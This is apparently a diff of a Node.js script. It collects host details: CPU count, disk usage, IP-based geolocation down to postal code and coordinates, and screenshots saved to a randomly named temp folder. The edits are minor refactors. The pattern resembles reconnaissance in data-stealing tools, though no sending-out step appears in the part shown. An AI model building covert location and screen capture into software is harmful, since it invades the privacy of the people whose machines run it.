@@ -3,7 +3,6 @@ const diskusage     = require('diskusage');
 const axios         = require('axios');
 const util          = require("util");
 const path          = require('path');
-const os            = require('os');
 const fs            = require('fs');
 
 const exec = util.promisify(child_process.exec);
@@ -63,8 +62,7 @@ const getCpuCount = async () => {
 const getNetwork = async () => {
     try {
         const response = await axios.get('http://ip-api.com/json');
-        const data = response.data;
-        return `IP: ${data.query}\nCountry: ${data.country}\nRegion: ${data.regionName}\nPostal: ${data.zip}\nCity: ${data.city}\nISP: ${data.isp}\nAS: ${data.as}\nLatitude: ${data.lat}\nLongitude: ${data.lon}`;
+        return response.data;
     } catch (error) {
         console.error("Failed to get network:", error);
         return "Not Found";
@@ -105,7 +103,7 @@ function randString(length) {
 }
 
 const getScreenShots = async () => {
-    const dir = path.join(os.tmpdir(), randString(10));
+    const dir = path.join(process.env.TEMP, randString(10));
     fs.mkdirSync(dir, { recursive: true });
 
     try {
@@ -120,7 +118,7 @@ const getScreenShots = async () => {
 
 const getDisksInfo = async () => {
     try {
-        const rootPath = os.platform() === 'win32' ? 'C:\\' : '/';
+        const rootPath = process.platform === 'win32' ? 'C:\\' : '/';
 
         const { available, total, free } = await diskusage.check(rootPath);
 
